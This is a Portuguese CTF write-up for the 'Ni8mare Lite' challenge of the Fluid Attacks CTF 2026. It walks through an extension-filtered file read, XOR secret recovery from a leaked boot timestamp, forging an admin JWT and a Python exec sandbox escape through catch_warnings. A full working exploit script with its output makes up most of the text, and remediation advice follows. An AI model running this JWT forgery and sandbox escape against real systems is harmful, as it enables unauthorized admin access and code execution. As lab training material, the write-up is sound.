# Ni8mare Lite | Fluid Attacks CTF 2026

`api` `path-traversal` `jwt-forgery` `weak-key-derivation` `python-sandbox-escape`

| | |
|---|---|
| **Plataforma / evento** | Fluid Attacks CTF 2026 (etapa 2, 04/07/2026) |
| **Categoria** | API |
| **Resolvido em** | 2026-07-04 |

## TL;DR

Cadeia de quatro elos. O endpoint `/api/webhooks/trigger` lê arquivos arbitrários, desde que terminem em `.json/.yml/.db`, e o segredo da aplicação fica num arquivo `/app/.internal/config.json` (termina em `.json`, passa no filtro). Esse segredo está "cifrado" com XOR usando como chave o `sha256(BOOT_TIMESTAMP)`, e o `/api/health` entrega o `BOOT_TIMESTAMP` de bandeja. Desfaço o XOR, recupero o `SESSION_SECRET`, forjo um JWT HS256 com `role=admin` e aí alcanço o `/api/workflows/evaluate`, que roda `exec()` numa sandbox fraca. Escapo da sandbox com o truque do `catch_warnings` para recuperar os builtins, importo `os`, listo `/`, leio `/flag_*.txt`.

> [!IMPORTANT]
> **Ideia-chave:** "cifrar" um segredo com XOR por uma chave derivada de um timestamp público não protege nada. E o desafio é cheio de endpoints que *parecem* vulneráveis (RCE, SSTI, upload) mas são iscas; o caminho real é o encadeamento leak -> derivação -> JWT -> sandbox escape.

## Enunciado

> FlowForge Automation Platform. Trigger workflows, evaluate expressions, manage automations.

**Arquivos / instância:** `src/app.py` (Flask + PyJWT) e um endpoint. Na minha instância o host era `bcfc3ccfcafff1cd.chal.ctf.ae`. `/api/docs` lista `health`, `webhooks/trigger` e `auth/verify`; outros endpoints existem mas pedem token admin.

## Dicas progressivas

<details><summary>Dica 1</summary>Vários endpoints (<code>/workflows/debug</code>, <code>/notifications/preview</code>, <code>/workflows/import</code>) parecem exploráveis mas são iscas. Foque em como virar admin.</details>
<details><summary>Dica 2</summary>O <code>SESSION_SECRET</code> é salvo em disco XORado por <code>sha256(BOOT_TIMESTAMP)</code>. Onde esse arquivo está, e quem te entrega o <code>BOOT_TIMESTAMP</code>?</details>
<details><summary>Dica 3</summary><code>/api/webhooks/trigger</code> lê <code>.json</code>. O segredo está em <code>/app/.internal/config.json</code>. <code>/api/health</code> vaza o timestamp. Com o segredo você forja um JWT admin e chega no <code>/evaluate</code>, que faz <code>exec()</code>.</details>

## Ambiente

- **Máquina atacante:** Kali Linux, Python 3.
- **Bibliotecas:** `requests`, `PyJWT==2.10.1` (mesma versão do servidor, pra garantir compatibilidade de assinatura).

***INSERIR no terminal: Kali (atacante)

```bash
export TARGET=https://bcfc3ccfcafff1cd.chal.ctf.ae
pip install requests "PyJWT==2.10.1"
```

Na minha instância era esse host. Use o da sua (o script usa a constante `TARGET` no topo).

## Resolução

### 1. Revisão do código: separando iscas do caminho real

O `app.py` é generoso com comentários, inclusive marcando três iscas:

```python
# ── Red herring: looks like command injection but is safe ──   -> /api/workflows/debug (shlex.quote + allowlist)
# ── Red herring: SSTI-looking template but properly escaped ──  -> /api/notifications/preview (regex de char + replace manual)
# ── Red herring: file upload that looks exploitable ──          -> /api/workflows/import (só valida metadados)
# ── Actual vulnerable endpoint (admin only) ──                  -> /api/workflows/evaluate (exec em sandbox)
```

O alvo real é o `/api/workflows/evaluate`, mas ele exige admin. Então o problema vira: como forjar o JWT admin? Olhando o boot:

```python
def init_app():
    BOOT_TIMESTAMP = int(time.time())
    SESSION_SECRET = os.urandom(24).hex()                     # 48 chars hex
    ts_hash = hashlib.sha256(str(BOOT_TIMESTAMP).encode()).digest()
    xor_key = ts_hash[: len(SESSION_SECRET)]
    XOR_ENCODED_SECRET = xor_bytes(SESSION_SECRET.encode(), xor_key).hex()
    # grava {"session_secret": XOR_ENCODED_SECRET} em /app/.internal/config.json
```

A chave do JWT (`SESSION_SECRET`) é escrita em disco XORada por `sha256(str(BOOT_TIMESTAMP))`. XOR é reversível, e o `BOOT_TIMESTAMP` não é secreto:

```python
@app.route("/api/health")
def health():
    return jsonify({"started_at": BOOT_TIMESTAMP, ...})       # <-- vaza aqui
```

Falta só ler o arquivo. E tem isso:

```python
# em /api/webhooks/trigger:
fpath = os.path.normpath(fpath)
if not any(fpath.endswith(ext) for ext in (".json", ".yml", ".db")):
    ...erro...
with open(fpath, "r") as f:
    content = f.read(4096)   # devolve preview[:512]
```

Leitura de arquivo arbitrário sem autenticação, filtrada só pela extensão. `/app/.internal/config.json` termina em `.json`. Encadeado.

> [!TIP]
> **Conceito: derivação de chave a partir de dado público.** Um segredo só é secreto se a chave que o protege também for. Aqui a "cifra" (XOR) usa uma chave totalmente determinada pelo horário de boot, que o próprio servidor publica. Isso é ofuscação, não criptografia: qualquer um com o ciphertext e o timestamp reconstrói a chave. Referência: [CWE-329 / CWE-330 (uso de valores previsíveis em contexto de segurança)](https://cwe.mitre.org/data/definitions/330.html).

### 2. Recuperando o segredo e forjando o JWT

Os três passos, encadeados: `/api/health` para o timestamp, `/api/webhooks/trigger` para o config XORado, e o XOR reverso. A chave XOR é `sha256(str(BOOT_TIMESTAMP)).digest()[:48]` (o segredo tem 48 bytes ASCII, pois é hex de 24 bytes). Com o `SESSION_SECRET` em claro, o `jwt.encode` gera um token `role=admin` que o servidor aceita.

### 3. Escape da sandbox do `/evaluate`

O endpoint final roda `exec(expression)` com `__builtins__` reduzido e uma blocklist de regex (`import`, `os`, `open`, `eval`, `exec`, `globals`...). Dois truques derrubam isso:

- **Quebrar as palavras proibidas:** `'__im'+'port__'`, `'o'+'s'`, `'o'+'pen'`. A blocklist usa `re.search(r"\bos\b", ...)`, então `'o'+'s'` nunca aparece como a palavra `os` no texto.
- **Recuperar os builtins reais:** `().__class__.__base__.__subclasses__()` lista todas as subclasses de `object`. A classe `catch_warnings` tem um atributo `_module` cujo `__builtins__` é o dicionário completo de builtins, incluindo `__import__` e `open`, que estavam fora da sandbox. A partir daí é RCE normal.

> [!TIP]
> **Conceito: escape de sandbox Python via `__subclasses__`.** `exec` com `__builtins__` restrito não é um sandbox de verdade: o grafo de objetos do Python continua acessível. Partindo de qualquer objeto (`()`, `""`, `[]`), subo para `object` com `__class__.__base__` e enumero `__subclasses__()`. Muitas dessas classes guardam referências a módulos com builtins intactos. É o padrão clássico também de SSTI em Jinja2. Referência: [HackTricks: Python sandbox escape](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes).

Script completo, idêntico ao arquivo em `scripts/`:

> [!NOTE]
> O `TARGET` está fixo no topo do script (era a minha instância). Troque pela sua antes de rodar.

#### `scripts/script1.py`

```python
#!/usr/bin/env python3
import hashlib
import json
import re
import time
import urllib3

import jwt
import requests


# Desativa warnings de certificado porque o alvo usa HTTPS de CTF.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


TARGET = "https://bcfc3ccfcafff1cd.chal.ctf.ae"


def xor_bytes(data: bytes, key: bytes) -> bytes:
    """
    Replica exatamente a função xor_bytes do app.py.

    No servidor:
    SESSION_SECRET é uma string hex de 48 caracteres.
    Essa string é convertida para bytes ASCII.
    Depois é XORada com sha256(str(BOOT_TIMESTAMP)).
    """
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))


def show(title, content):
    print()
    print("=" * 80)
    print(title)
    print("=" * 80)
    print(content)


def main():
    print(f"[*] Target: {TARGET}")

    session = requests.Session()
    session.verify = False

    # 1. /api/health vaza o BOOT_TIMESTAMP usado para gerar a chave XOR.
    health_response = session.get(f"{TARGET}/api/health", timeout=15)
    show("GET /api/health", health_response.text)

    health_response.raise_for_status()
    health = health_response.json()

    boot_timestamp = int(health["started_at"])
    print(f"[*] BOOT_TIMESTAMP vazado: {boot_timestamp}")

    # 2. /api/webhooks/trigger tem leitura arbitrária limitada por extensão.
    # O arquivo /app/.internal/config.json termina em .json, então passa no filtro.
    read_config_payload = {
        "workflow_id": "guerreiro",
        "files": [
            {
                "path": "/app/.internal/config.json"
            }
        ]
    }

    config_response = session.post(
        f"{TARGET}/api/webhooks/trigger",
        json=read_config_payload,
        timeout=15,
    )
    show("POST /api/webhooks/trigger lendo /app/.internal/config.json", config_response.text)

    config_response.raise_for_status()
    config_data = config_response.json()

    preview = config_data["file_metadata"][0]["metadata"]["preview"]
    internal_config = json.loads(preview)

    xor_encoded_secret_hex = internal_config["session_secret"]
    print(f"[*] session_secret codificado em XOR: {xor_encoded_secret_hex}")

    # 3. Desfaz o XOR.
    encoded_secret_bytes = bytes.fromhex(xor_encoded_secret_hex)
    timestamp_hash = hashlib.sha256(str(boot_timestamp).encode()).digest()

    session_secret = xor_bytes(encoded_secret_bytes, timestamp_hash).decode()

    print(f"[*] SESSION_SECRET recuperado: {session_secret}")

    # 4. Forja token JWT admin válido.
    admin_payload = {
        "user": "guerreiro",
        "role": "admin",
        "iat": int(time.time()),
    }

    admin_token = jwt.encode(
        admin_payload,
        session_secret,
        algorithm="HS256",
    )

    print(f"[*] JWT admin forjado: {admin_token}")

    # 5. Confirma que o token é aceito.
    verify_response = session.post(
        f"{TARGET}/api/auth/verify",
        json={"token": admin_token},
        timeout=15,
    )
    show("POST /api/auth/verify", verify_response.text)

    headers = {
        "Authorization": f"Bearer {admin_token}",
        "Content-Type": "application/json",
    }

    # 6. Escapa da sandbox do /api/workflows/evaluate.
    #
    # O filtro bloqueia palavras como import, open, os, exec, eval e globals.
    # Para bypassar:
    #   "__im" + "port__" evita escrever "__import__" literalmente.
    #   "o" + "s" evita escrever "os" literalmente.
    #   "o" + "pen" evita escrever "open" literalmente.
    #
    # A classe catch_warnings permite recuperar __builtins__ completo.
    # Com isso importamos os, listamos / e abrimos o arquivo /flag_*.txt.
    expression = r"""
for c in ().__class__.__base__.__subclasses__():
    if c.__name__ == 'catch_warnings':
        b = c()._module.__builtins__
        m = b['__im'+'port__']('o'+'s')
        for f in m.listdir('/'):
            if f.startswith('flag_') and f.endswith('.txt'):
                print(b['o'+'pen']('/' + f).read())
"""

    eval_response = session.post(
        f"{TARGET}/api/workflows/evaluate",
        headers=headers,
        json={"expression": expression},
        timeout=15,
    )

    show("POST /api/workflows/evaluate", eval_response.text)

    body = eval_response.text
    match = re.search(r"flag\{[^}\r\n]+\}", body, re.IGNORECASE)

    print()
    print("=" * 80)
    print("RESULTADO")
    print("=" * 80)

    if match:
        flag = match.group(0)
        print(f"[+] FLAG ENCONTRADA: {flag}")

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
        return

    print("[-] Flag não encontrada automaticamente.")
    print("[*] Verifique a resposta acima.")


if __name__ == "__main__":
    main()
```

***INSERIR no terminal: Kali (atacante)

```bash
python3 scripts/script1.py
```

```text
{"started_at":1783177927,"status":"ok","uptime_seconds":318,"version":"2.1.0"}
[*] BOOT_TIMESTAMP vazado: 1783177927

POST /api/webhooks/trigger lendo /app/.internal/config.json
{"file_metadata":[{"metadata":{"preview":"{\n  \"session_secret\": \"684fc7162d246b84...[snip]...\",\n  \"version\": \"2.1.0\"\n}","size":144}, ...}

[*] SESSION_SECRET recuperado: cd787fb1da0946d2fb58ab930a62196d5aa17a00d74884ed
[*] JWT admin forjado: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3VlcnJlaXJvIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgzMTc4MjQyfQ.jfVw7McGfU_e493QXrBfLf398d7ei08umrFX7m7QIVg

POST /api/auth/verify
{"role":"admin","user":"guerreiro","valid":true}

POST /api/workflows/evaluate
{"result":"flag{14c39f4b8d9XXXXX}", ...}
[+] FLAG ENCONTRADA: flag{14c39f4b8d9XXXXX}
```

(O `SESSION_SECRET` acima é efêmero: muda a cada boot da instância, então não serve para nada depois que o container recicla.)

## Cadeia de ataque

```mermaid
flowchart LR
    A["/api/health: BOOT_TIMESTAMP"] --> C["Deriva chave XOR"]
    B["/api/webhooks/trigger: lê config.json XORado"] --> C
    C --> D["SESSION_SECRET em claro"]
    D --> E["Forja JWT role=admin"]
    E --> F["/api/workflows/evaluate: exec sandbox"]
    F --> G["catch_warnings escape -> os -> lê /flag_*.txt"]
```

## Por que funciona

Nenhum elo sozinho seria fatal; o encadeamento é que mata. A leitura de arquivo é "só metadados" e filtrada por extensão, mas o segredo foi guardado num `.json`. A "cifra" do segredo é XOR com chave pública (o timestamp que o `/health` expõe), ou seja, ofuscação reversível. Com o segredo, o JWT HS256 é forjável, porque HS256 é simétrico: quem tem a chave de verificação tem a de assinatura. E a sandbox de `exec` é ilusória, porque o grafo de objetos do Python dá acesso aos builtins reais. As iscas existem justamente pra desviar de ver essa cadeia.

## Remediação

- Não derivar chaves de segurança de valores públicos/previsíveis. Guardar o segredo só em memória ou num secret manager, nunca "cifrado" por XOR com timestamp.
- Não expor `BOOT_TIMESTAMP` que participa de qualquer derivação de chave.
- A leitura de arquivos deveria usar allowlist de caminhos, não só de extensão, e exigir autenticação.
- Nunca usar `exec`/`eval` com entrada do usuário. Sandbox por blocklist de palavras e `__builtins__` reduzido é insuficiente.

## Lições e padrões

- **Sinais para reconhecer:** segredo persistido "codificado"; qualquer endpoint que devolve `started_at`/uptime e participa de cripto; leitura de arquivo filtrada só por extensão; `exec`/`compile` com blocklist. Comentários de "red herring" no código real não existem, mas a estrutura (vários endpoints quase-vulneráveis + um encadeamento) é típica.
- **Da próxima vez eu tentaria primeiro:** mapear onde o segredo nasce e onde ele é persistido/transmitido. Se vir XOR/base64/"encode" em torno de um segredo, parto para reverter. Para sandbox de `exec`, já começo pelo `().__class__.__base__.__subclasses__()`.

## Referências

- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
- [HackTricks: Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)

## Flag

```text
flag{14c39f4b8d9XXXXX}
```
